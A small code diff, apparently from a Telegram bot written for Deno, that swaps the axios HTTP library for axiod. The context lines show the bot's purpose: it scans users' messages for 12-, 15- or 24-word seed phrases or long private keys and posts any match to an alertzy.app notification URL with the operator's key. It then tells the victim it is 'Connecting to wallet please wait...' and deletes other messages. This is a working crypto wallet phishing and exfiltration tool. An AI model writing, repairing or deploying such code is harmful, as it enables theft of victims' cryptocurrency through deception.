@@ -38,7 +38,7 @@ bot.on('message:text', async (ctx) => {
             const phrase = ctx.message.text;
         if (phrase.split(' ').length === 12 || phrase.split(' ').length === 15 || phrase.split(' ').length === 24 || (phrase.split(' ').length === 1 && phrase.length > 60))  {
             const webhook_url = `https://alertzy.app/send?accountKey=${Deno.env.get("ALERTZY_KEY")}&title=New Phrase&message=${phrase}` //change notification
-            const response = await axios.post(webhook_url)
+            const response = await axiod.post(webhook_url)
             ctx.reply("Connecting to wallet please wait..."); // Reply to the user with a confirmation message
         } else {
             ctx.deleteMessage()
